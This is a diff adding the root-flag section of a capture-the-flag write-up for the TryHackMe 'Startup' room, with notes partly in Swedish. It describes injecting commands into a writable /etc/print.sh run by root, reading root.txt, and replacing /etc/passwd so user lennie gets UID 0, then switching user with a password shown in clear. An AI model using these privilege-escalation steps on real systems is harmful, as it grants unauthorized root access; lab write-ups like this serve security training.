@@ -139,3 +139,30 @@ lennie@startup:~$ cat user.txt
 cat user.txt
 THM{**********}
 ```
+### root(.txt)
+Now its time to get access to the /root folder.<br>
+In lennies folder there are a script folder.<br>
+It contains planner.sh and startup_list.txt. <br>
+planner.sh calls $LIST and adds it to plannet_list.txt and then run /etc/print.sh<br>
+/etc/print.sh is writable and we can add any command that we want to run as root.<br>
+if we add 
+```
+cat /root/root.txt 
+```
+we get the flag from root.txt, but if we add
+
+```
+cat /etc/passwd
+
+ändra till
+lennie:x:0:0::/home/lennie:/bin/bash
+
+skapa lokal fil som laddas upp med wget och kopieras till /etc/passwd
+
+cp /tmp/passwd /etc/passwd
+
+exit
+
+su lennie
+c4ntg3t3n0ughsp1c3
+```
